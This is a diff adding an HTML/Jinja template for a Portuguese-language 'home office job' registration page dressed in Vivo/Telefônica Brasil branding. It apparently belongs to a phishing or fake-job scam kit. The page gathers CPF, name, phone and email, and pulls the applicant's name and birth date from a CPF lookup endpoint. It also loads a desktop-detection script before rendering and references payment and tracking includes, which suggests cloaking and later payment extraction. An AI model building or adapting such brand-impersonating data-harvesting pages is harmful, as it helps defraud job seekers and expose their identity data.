@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+    
+    <!-- Facebook Pixel Codes -->
+    {% include 'pagamento_head.html' %}
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cadastro - Vagas Home Office - Vivo</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeRegular.woff2') }}') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeBold.woff2') }}') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeLight.woff2') }}') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+    </style>
+    
+    <!-- Fallback Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" type="image/png">
+</head>
+<body>
+    <!-- Header -->
+    <header class="vivo-header">
+        <div class="container">
+            <div class="row align-items-center py-3">
+                <div class="col-6">
+                    <a href="{{ url_for('index') }}">
+                        <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
+                    </a>
+                </div>
+                <div class="col-6 text-end">
+                    <a href="#" class="text-white mx-2"><i class="fas fa-user fs-4"></i></a>
+                    <a href="#" class="text-white position-relative mx-2">
+                        <i class="fas fa-bell fs-4"></i>
+                        <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                            1
+                        </span>
+                    </a>
+                    <a href="#" class="btn btn-link text-decoration-none d-none d-md-inline-block ms-3">Minha Vivo</a>
+                    <a href="#" class="btn btn-outline-light rounded-pill btn-sm d-none d-md-inline-block">Ajuda</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Breadcrumbs -->
+    <div class="container py-1" style="border-bottom: 1px solid #eee;">
+        <div>
+            <span style="font-size: 11px; color: #888;">TRABALHE CONOSCO &gt; HOME OFFICE &gt; CADASTRO</span>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <main class="container my-4">
+        <div class="row">
+            <div class="col-lg-8 mx-auto">
+                <div class="card shadow-sm">
+                    <div class="card-header" style="background-color: #660099; color: white;">
+                        <h5 class="mb-0">Cadastro Inicial</h5>
+                    </div>
+                    <div class="card-body p-4">
+                        <div class="text-center mt-2 mb-4">
+                            <h4 style="color: #660099; font-weight: 500;">Dados Pessoais</h4>
+                            <p class="text-muted mb-0">Precisamos de algumas informações para iniciar seu processo</p>
+                        </div>
+                        
+                        <div style="background-color: #EFEDFE; border-radius: 8px; padding: 20px; margin-bottom: 20px; border: 1px solid #d8d4fa;">
+                            <h5 style="color: #660099; font-weight: 600; margin-bottom: 15px; font-size: 18px;">Vaga: Atendimento ao Cliente Home Office</h5>
+                            
+                            <form id="candidateForm" class="mb-3" action="{{ url_for('teste_aptidao') }}{{ '?' + request.query_string.decode() if request.query_string else '' }}" method="post">
+                                <div class="mb-3">
+                                    <label for="candidateCPF" class="form-label">CPF</label>
+                                    <input type="text" class="form-control" id="candidateCPF" name="cpf" placeholder="000.000.000-00" required maxlength="14" inputmode="numeric">
+                                    <small class="text-muted" id="cpfStatus"></small>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="candidateName" class="form-label">Nome completo</label>
+                                    <input type="text" class="form-control" id="candidateName" name="nome" required>
+                                </div>
+                                
+                                <div class="mb-3" id="dataNascimentoDiv" style="display: none;">
+                                    <label for="candidateDataNascimento" class="form-label">Data de nascimento</label>
+                                    <input type="text" class="form-control" id="candidateDataNascimento" name="data_nascimento" placeholder="DD/MM/AAAA" maxlength="10" inputmode="numeric">
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="candidatePhone" class="form-label">Telefone celular</label>
+                                    <input type="tel" class="form-control" id="candidatePhone" name="telefone" placeholder="(00) 00000-0000" required maxlength="15" inputmode="numeric">
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="candidateEmail" class="form-label">E-mail</label>
+                                    <input type="email" class="form-control" id="candidateEmail" name="email" required>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label class="form-label">Escolaridade</label>
+                                    <div class="education-options">
+                                        <div class="row">
+                                            <div class="col-md-6 mb-2">
+                                                <input type="radio" class="btn-check" name="escolaridade" id="option-ensino-medio-incompleto" value="medio_incompleto" required>
+                                                <label class="btn w-100 education-option" for="option-ensino-medio-incompleto">Ensino Médio Incompleto</label>
+                                            </div>
+                                            <div class="col-md-6 mb-2">
+                                                <input type="radio" class="btn-check" name="escolaridade" id="option-ensino-medio" value="medio_completo">
+                                                <label class="btn w-100 education-option" for="option-ensino-medio">Ensino Médio Completo</label>
+                                            </div>
+                                            <div class="col-md-6 mb-2">
+                                                <input type="radio" class="btn-check" name="escolaridade" id="option-superior-incompleto" value="superior_incompleto">
+                                                <label class="btn w-100 education-option" for="option-superior-incompleto">Superior Incompleto</label>
+                                            </div>
+                                            <div class="col-md-6 mb-2">
+                                                <input type="radio" class="btn-check" name="escolaridade" id="option-superior-completo" value="superior_completo">
+                                                <label class="btn w-100 education-option" for="option-superior-completo">Superior Completo</label>
+                                            </div>
+                                            <div class="col-md-6 mb-2">
+                                                <input type="radio" class="btn-check" name="escolaridade" id="option-pos-graduacao" value="pos_graduacao">
+                                                <label class="btn w-100 education-option" for="option-pos-graduacao">Pós-Graduação</label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <style>
+                                    .education-option {
+                                        background-color: #f8f8f8;
+                                        border: 1px solid #e0e0e0;
+                                        color: #666;
+                                    }
+                                    
+                                    .btn-check:checked + .education-option {
+                                        background-color: #660099 !important;
+                                        color: white !important;
+                                        border-color: #660099 !important;
+                                    }
+                                    
+                                    .btn-check:focus + .education-option, 
+                                    .education-option:focus {
+                                        box-shadow: 0 0 0 0.25rem rgba(102, 0, 153, 0.25);
+                                    }
+                                    
+                                    .education-option:hover {
+                                        background-color: #f0f0f0;
+                                        border-color: #d0d0d0;
+                                    }
+                                </style>
+                                
+                                <p style="font-size: 13px; color: #444; margin-bottom: 15px;">
+                                    <i class="fas fa-info-circle me-1" style="color: #660099;"></i> Após o cadastro inicial, você realizará um teste de aptidão com 20 perguntas sobre atendimento ao cliente.
+                                </p>
+                                
+                                <div class="d-flex justify-content-center">
+                                    <button type="submit" class="vivo-btn" style="width: 100%; max-width: 280px;">
+                                        PROSSEGUIR PARA O TESTE
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-4 mt-5" style="background-color: #660099; color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Produtos e Serviços</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Planos Móveis</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Internet Fixa</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">TV</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Combo Vivo</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Vivo App</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Suporte</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Minha Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">2ª Via de Conta</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Cobertura</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Desbloqueio</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Institucional</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sobre a Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sustentabilidade</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Trabalhe Conosco</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Para Empresas</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5 class="mb-3">Redes Sociais</h5>
+                    <div class="d-flex mb-4">
+                        <a href="#" class="text-white me-3"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-youtube"></i></a>
+                        <a href="#" class="text-white"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                    <h5 class="mb-3">Baixe o App</h5>
+                    <div class="d-flex">
+                        <a href="#" class="text-white me-3"><i class="fab fa-app-store-ios"></i> App Store</a>
+                        <a href="#" class="text-white"><i class="fab fa-google-play"></i> Google Play</a>
+                    </div>
+                </div>
+            </div>
+            <hr class="my-4" style="border-color: rgba(255,255,255,0.2);">
+            <div class="row">
+                <div class="col-12 text-center text-white-50 small">
+                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
+                    <p class="mb-0">CNPJ: 02.558.157/0001-62 | Endereço: Av. Eng. Luiz Carlos Berrini, 1376 - São Paulo - SP - 04571-936</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+                
+    <!-- Bootstrap, jQuery e Popper.js -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+    
+    <!-- Scripts de formatação para CPF e telefone -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Máscara para CPF
+            const cpfInput = document.getElementById('candidateCPF');
+            const cpfStatus = document.getElementById('cpfStatus');
+            const nameInput = document.getElementById('candidateName');
+            const dataNascimentoDiv = document.getElementById('dataNascimentoDiv');
+            const dataNascimentoInput = document.getElementById('candidateDataNascimento');
+            
+            let typingTimer;
+            const doneTypingInterval = 1000; // 1 segundo após parar de digitar
+            
+            cpfInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 3 && value.length <= 6) {
+                    value = value.replace(/^(\d{3})(\d)/, '$1.$2');
+                } else if (value.length > 6 && value.length <= 9) {
+                    value = value.replace(/^(\d{3})(\d{3})(\d)/, '$1.$2.$3');
+                } else if (value.length > 9) {
+                    value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+                }
+                
+                e.target.value = value;
+                
+                // Limpa o timer anterior e inicia um novo
+                clearTimeout(typingTimer);
+                
+                // Verifica se o CPF tem 11 dígitos (sem formatação)
+                if (value.replace(/\D/g, '').length === 11) {
+                    cpfStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando CPF...';
+                    cpfStatus.style.color = '#666';
+                    
+                    typingTimer = setTimeout(function() {
+                        consultarCPF(value);
+                    }, doneTypingInterval);
+                } else {
+                    cpfStatus.innerHTML = '';
+                    dataNascimentoDiv.style.display = 'none';
+                }
+            });
+            
+            // Função para consultar o CPF
+            function consultarCPF(cpf) {
+                // Remove caracteres não numéricos
+                const cpfLimpo = cpf.replace(/\D/g, '');
+                
+                fetch(`/consultar_cpf/${cpfLimpo}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === true && data.result) {
+                            // Dados encontrados
+                            cpfStatus.innerHTML = '<i class="fas fa-check-circle"></i> CPF verificado com sucesso';
+                            cpfStatus.style.color = 'green';
+                            
+                            // Preenche o nome e exibe o campo de data de nascimento
+                            if (data.result.nome) {
+                                nameInput.value = data.result.nome;
+                            }
+                            
+                            if (data.result.data_nascimento) {
+                                dataNascimentoDiv.style.display = 'block';
+                                dataNascimentoInput.value = data.result.data_nascimento;
+                            }
+                            
+                            // Salvar dados no localStorage para reutilizar na carteira digital
+                            localStorage.setItem('userData', JSON.stringify({
+                                cpf: cpfLimpo,
+                                nome: data.result.nome,
+                                dataNascimento: data.result.data_nascimento
+                            }));
+                        } else {
+                            // Dados não encontrados ou erro
+                            cpfStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> CPF não encontrado ou inválido';
+                            cpfStatus.style.color = 'red';
+                            dataNascimentoDiv.style.display = 'none';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Erro ao consultar CPF:', error);
+                        cpfStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Erro ao verificar CPF';
+                        cpfStatus.style.color = 'red';
+                        dataNascimentoDiv.style.display = 'none';
+                    });
+            }
+            
+            // Formato da data de nascimento
+            dataNascimentoInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2 && value.length <= 4) {
+                    value = value.replace(/^(\d{2})(\d)/, '$1/$2');
+                } else if (value.length > 4) {
+                    value = value.replace(/^(\d{2})(\d{2})(\d)/, '$1/$2/$3');
+                }
+                
+                e.target.value = value;
+            });
+            
+            // Máscara para telefone
+            const phoneInput = document.getElementById('candidatePhone');
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2 && value.length <= 6) {
+                    value = value.replace(/^(\d{2})(\d)/, '($1) $2');
+                } else if (value.length > 6 && value.length <= 10) {
+                    value = value.replace(/^(\d{2})(\d{4})(\d)/, '($1) $2-$3');
+                } else if (value.length > 10) {
+                    value = value.replace(/^(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+                }
+                
+                e.target.value = value;
+            });
+        });
+    </script>
+</body>
+</html>
